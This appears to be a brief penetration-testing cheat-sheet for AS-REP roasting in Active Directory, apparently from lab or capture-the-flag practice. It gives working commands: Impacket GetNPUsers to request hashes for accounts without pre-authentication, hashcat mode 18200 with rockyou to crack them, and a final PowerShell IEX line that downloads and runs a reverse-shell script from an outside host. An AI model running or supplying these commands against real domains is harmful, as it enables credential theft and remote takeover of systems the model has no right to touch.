# Requirements:

1. List of valid users.
2. A user accounts should have the pre-authentication option disabled.

## Impacket
```bash
impacket-GetNPUsers DomainName/ -usersfile real_users -dc-ip 10.10.10.161 -request -format hashcat
```

## Cracking with hashcat
```bash
hashcat -m 18200 hash.txt ~/wordlists/rockyou.txt
```

powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24:8080/mini-reverse.ps1')